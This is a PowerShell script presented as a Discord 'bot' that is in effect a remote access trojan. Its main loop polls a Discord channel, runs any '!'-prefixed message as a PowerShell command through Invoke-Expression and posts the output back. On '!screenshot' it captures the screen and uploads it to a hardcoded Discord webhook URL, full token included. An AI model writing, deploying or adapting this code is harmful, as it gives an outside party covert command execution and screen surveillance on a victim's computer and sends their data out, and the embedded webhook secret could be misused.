# Define hardcoded token, channelId, botUserId, and baseUrl
$botUserId = "1282419666022563975"  # Hardcoded bot user ID
$baseUrl = "https://discord.com/api/v10"

# Create a reusable HttpClient
Add-Type -AssemblyName System.Net.Http
$client = New-Object System.Net.Http.HttpClient

# Set the Authorization header for all requests
$client.DefaultRequestHeaders.Authorization = "Bot $token"
$client.DefaultRequestHeaders.Accept.Add("application/json")

# Function to send a message to Discord
function Send-DiscordMessage {
    param (
        [string]$Message
    )

    # Create request body as JSON
    $body = @{
        "content" = $Message
    } | ConvertTo-Json

    # Create StringContent for HTTP Post request
    $content = New-Object System.Net.Http.StringContent($body, [System.Text.Encoding]::UTF8, "application/json")

    # Send the POST request to Discord
    try {
        $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $content).Result
        if ($response.IsSuccessStatusCode) {
            Write-Host "Message sent successfully."
        } else {
            Write-Host "Error sending message. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
        }
    } catch {
        Write-Host "Error sending message: $_"
    }
}

# Function to capture a screenshot and save it as a file in the %TEMP% directory
function Capture-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Capture the primary screen
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen(0, 0, 0, 0, $screen.Size)

    # Save screenshot to %TEMP% directory with timestamp
    $fileName = "$env:TEMP\screenshot_$((Get-Date).ToString('yyyyMMdd_HHmmss')).png"
    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)

    return $fileName
}

# Function to send screenshot to Discord via webhook
function Send-DiscordWebhook {
    param (
        [string]$webhookUrl,
        [string]$filePath
    )

    # Create multipart content with the file
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $boundary = [System.Guid]::NewGuid().ToString()
    
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"payload_json`"",
        "Content-Type: application/json$LF",
        "{`"content`":`"New screenshot uploaded`"}",
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: image/png$LF",
        [System.IO.File]::ReadAllText($filePath),
        "--$boundary--$LF"
    ) -join $LF

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    # Send the POST request to Discord with the image
    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $bodyLines
        Write-Host "Screenshot sent successfully."
        Write-Host "Response: $($response | ConvertTo-Json -Depth 3)"
    } catch {
        Write-Host "Error sending screenshot: $_"
    }
}

# Function to capture a screenshot and send it to Discord when !screenshot or !sh command is issued
function CaptureAndSendScreenshot {
    $screenshot = Capture-Screenshot  # Capture screenshot and get the file path

    if ($screenshot) {
        Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot  # Send the image to Discord
    } else {
        Write-Host "Screenshot capture failed, no file to send."
    }
}

# Function to execute a PowerShell command
function Execute-PowerShellCommand {
    param (
        [string]$command
    )

    try {
        # Run the PowerShell command and capture the output
        $output = Invoke-Expression $command  # Runs the PowerShell command
        if ($output) {
            $result = $output -join "`n"  # Join multiline output for Discord message
        } else {
            $result = "Command executed successfully with no output."
        }
    } catch {
        $result = "Error executing command: $_"
    }

    # Limit output to a reasonable size for Discord
    if ($result.Length -gt 2000) {
        $result = $result.Substring(0, 1997) + "..."
    }

    Send-DiscordMessage -Message $result
}

# Function to get messages from Discord
function Get-DiscordMessages {
    try {
        # Add limit to fetch the most recent messages
        $response = $client.GetAsync("$baseUrl/channels/$channelId/messages?limit=10").Result
        if ($response.IsSuccessStatusCode) {
            $content = $response.Content.ReadAsStringAsync().Result
            return $content | ConvertFrom-Json
        } else {
            Write-Host "Error fetching messages. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
            return $null
        }
    } catch {
        Write-Host "Error fetching messages: $_"
        return $null
    }
}

# Initialize the bot by setting the last processed message ID
function Initialize-LastMessageId {
    $messages = Get-DiscordMessages
    if ($messages) {
        # Set $lastMessageId to the ID of the most recent message so old messages are ignored
        $global:lastMessageId = $messages[0].id
        Write-Host "Bot initialized. Ignoring messages before ID: $lastMessageId"
    }
}

# Webhook URL (replace with your own)
$WebhookUrl = "https://discord.com/api/webhooks/1279434221747961947/4v9LMvOEODPdrCLAPkBxgkjRc5Hkwfx2DkwBNy8AjJjp56aOwuuechnScKGGb77trwPb"

# Initialize the bot
Initialize-LastMessageId

# Main loop with rate limiting and command filtering
while ($true) {
    $messages = Get-DiscordMessages

    if ($messages) {
        foreach ($message in $messages) {
            # Process only if it's a new message and it's not sent by the bot itself
            if ($message.id -gt $lastMessageId -and $message.author.id -ne $botUserId) {
                if ($message.content.StartsWith("!")) {
                    $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase

                    # Check for !screenshot or !sh command
                    if ($command -eq "screenshot" -or $command -eq "sh") {
                        CaptureAndSendScreenshot  # Capture and send the screenshot
                    } else {
                        Execute-PowerShellCommand -command $command
                    }
                }
                $lastMessageId = $message.id  # Update the last processed message ID
            }
        }
    }

    Start-Sleep -Seconds 5
}
